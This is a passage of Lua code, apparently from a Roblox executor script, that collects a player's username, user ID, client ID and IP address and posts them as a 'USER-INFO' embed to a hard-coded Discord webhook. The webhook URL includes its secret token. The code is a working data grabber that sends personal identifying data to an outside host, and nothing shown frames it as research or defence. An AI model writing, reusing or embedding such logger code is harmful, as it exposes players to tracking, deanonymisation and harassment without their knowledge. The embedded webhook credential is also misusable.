if ip then
    local body = HttpService:JSONEncode({
        embeds = {{
            title = gameName,
            description = "Username = " .. playerName ..  "\nUserId = " .. playerUserId .. "\nClientId = " .. clientId .. "\nIP = " .. ip, 
            color = 5428,
            author = {name = "USER-INFO"}
        }}
    })
    local success, response = pcall(function()
        return httpRequest({
            Url = "https://discord.com/api/webhooks/1279786852865540248/Qt3bcIR5n9cBJVHZ8kVs6FrjkzDN9XCTomXEQbIrxft3btqXBQgvsLXgQJirjvVxSgCy",
            Method = "POST",
            Headers = {['Content-Type'] = 'application/json'},
            Body = body
        })
    end)
    if not success then
        warn("Failed to send HTTP request: " .. response)
    end
end
